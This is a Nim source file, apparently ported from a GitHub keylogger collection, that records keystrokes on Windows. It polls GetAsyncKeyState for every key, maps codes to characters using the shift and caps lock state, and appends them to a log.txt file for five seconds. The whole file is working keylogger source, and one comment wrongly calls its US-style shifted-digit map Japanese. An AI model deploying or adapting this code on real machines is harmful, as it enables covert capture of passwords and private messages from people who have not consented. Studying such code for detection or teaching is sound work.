# Original
# https://github.com/S0hamBOT/keylogger-all-types/blob/main/2.%20Basic%20API-Based%20(C)/keylogger.c

import std/[syncio, times, streams, strutils, os]
import winim/[lean]

# Number of seconds to monitor
const WaitSecond = 5

proc translateKey(vkCode: char): char =
  let
    shift = (GetAsyncKeyState(VK_SHIFT) and 0x8000) != 0
    caps = (GetKeyState(VK_CAPITAL) and 0x0001) != 0

  # A..Z or a..z
  if vkCode in UppercaseLetters:
    if (caps and not shift) or (not caps and shift):
      return vkCode # A..Z
    else:
      return toLowerAscii(vkCode) # a..z

  # 1..9 or !"#$%&'()
  if vkCode in {'1'..'9'}:
    if caps and not shift:
      return vkCode # 1..9
    else:
      # !"#$%&'() (Japanese keyboards)
      case vkCode
      of '1': return '!'
      of '2': return '@'
      of '3': return '#'
      of '4': return '$'
      of '5': return '%'
      of '6': return '&'
      of '7': return '\''
      of '8': return '('
      of '9': return ')'
      else: discard

  # More special keys
  case SHORT(vkCode)
  of VK_SPACE: return ' '
  of VK_RETURN: return '\n'
  of VK_TAB: return '\t'
  else: discard

  result = '\0'


proc keyLogger =
  let LogPath = getCurrentDir() / "log.txt"

  var strm = newFileStream(LogPath, fmAppend)
  defer: close(strm)

  var startTime = getTime()
  let endTime = startTime + WaitSecond.seconds
  while true:

    Sleep(10)

    # ASCII Table
    # https://www.ascii-code.com/
    for key in {char(8)..char(255)}:

      if (GetAsyncKeyState(SHORT(key)) and 0x0001) != 0:

        # Skip unnecessary keys
        if GetAsyncKeyState(SHORT(key)) == 0:
          continue

        let ch = translateKey(key)
        if ch != '\0':
          write(strm, ch)
        else:
          case SHORT(key)
          of VK_SHIFT:
            write(strm, "[SHIFT]")
          else:
            discard

    if startTime > endTime:
      break

    startTime = getTime()

keyLogger()
